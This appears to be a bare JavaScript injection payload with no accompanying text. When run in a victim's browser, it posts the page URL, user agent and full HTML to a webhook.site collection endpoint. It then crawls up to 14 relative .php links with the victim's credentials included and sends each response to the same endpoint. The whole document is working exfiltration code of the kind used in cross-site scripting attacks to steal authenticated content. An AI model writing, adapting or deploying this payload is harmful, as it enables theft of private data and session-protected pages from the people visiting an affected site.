(async()=>{
 const W="https://webhook.site/1b75af72-48d6-4cec-8c67-862c6d17df90";
 const send=(t,d)=>fetch(W+"/"+t,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:String(d).slice(0,59000)}).catch(()=>{});
 await send("landing",location.href+"\nUA:"+navigator.userAgent);
 await send("html",document.documentElement.outerHTML);
 const links=[...new Set([...document.querySelectorAll("a")].map(a=>a.getAttribute("href")).filter(h=>h&&h.indexOf(".php")>-1&&!h.startsWith("http")))].slice(0,14);
 for(const l of links){try{const r=await fetch(l,{credentials:"include"});const t=await r.text();await send("crawl",l+"\n----\n"+t.slice(0,55000));}catch(e){}}
})();
